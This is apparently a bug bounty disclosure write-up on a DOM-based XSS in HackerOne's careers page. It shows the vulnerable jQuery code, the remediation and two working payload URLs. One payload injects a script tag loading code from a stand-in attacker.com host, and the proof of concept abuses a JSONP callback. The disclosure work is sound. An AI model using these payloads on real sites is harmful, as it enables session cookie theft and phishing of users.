# Title: DOM-Based XSS in HackerOne's Careers Page

- **Platform**: Medium
- **Program**: HackerOne Bug Bounty Program
- **Severity**: Medium
- **Date**: 2024-11-12
- **Researcher**: Nguyenlv7
- **Bounty**: $500

## Summary
A DOM-based cross-site scripting vulnerability was discovered in HackerOne's careers page at www.hackerone.com/careers. The `?lever-` URL parameter was dynamically inserted into the DOM via jQuery without proper sanitization, enabling JavaScript execution on Internet Explorer and Microsoft Edge.

## Technical Details
The careers page used the Lever job posting integration. The JavaScript code read the `?lever-` parameter from the URL and appended it directly to anchor `href` attributes without encoding. While Content Security Policy (CSP) blocked the attack on modern browsers like Chrome and Firefox, it executed successfully on Internet Explorer and Edge where URL parsing and CSP enforcement behaved differently.

The vulnerable code:
```javascript
var pageUrl = window.location.href;
var leverParameter = '';
var trackingPrefix = '?lever-';
if(pageUrl.indexOf(trackingPrefix) >= 0){
  var pageUrlSplit = pageUrl.split(trackingPrefix);
  leverParameter = '?lever-' + pageUrlSplit[1];
}
var link = posting.hostedUrl + leverParameter;
jQuery('#jobs-container .jobs-list').append(
  '<a class="job-title" href="' + link + '">' + title + '</a>'
);
```

The `leverParameter` containing unsanitized user input was concatenated into the `href` attribute without HTML encoding.

## Steps to Reproduce
1. Craft a URL with a malicious `?lever-` parameter:
   `https://www.hackerone.com/careers?lever-#aaa"><script src="https://attacker.com/exploit.js"></script>`
2. Open the URL in Internet Explorer or Microsoft Edge
3. The injected script tag is parsed and executed
4. The script can steal cookies, redirect, or perform other malicious actions

## Proof of Concept
```
https://www.hackerone.com/careers?lever-#aaa"><script src="https://app-sj17.marketo.com/index.php/form/getForm?callback=alert"></script>
```

The fragment (`#aaa`) and HTML context break caused the script tag to be injected into the DOM.

## Impact
- JavaScript execution in the context of www.hackerone.com
- Session cookie theft
- Phishing attacks against HackerOne users
- While CSP blocked on modern browsers, IE/Edge users remained vulnerable
- The attack surface extended to any HackerOne user visiting the careers page with a crafted URL

## Remediation
HackerOne fixed the issue by properly encoding the URL parameter before inserting it into the DOM. Input validation was added to strip or encode dangerous characters, and the `lever-` parameter handling was reviewed for security.

## References
- https://osintteam.blog/500-bounty-dom-based-xss-in-hackerones-careers-page-019f78c5e213
- HackerOne Report ID: #474656
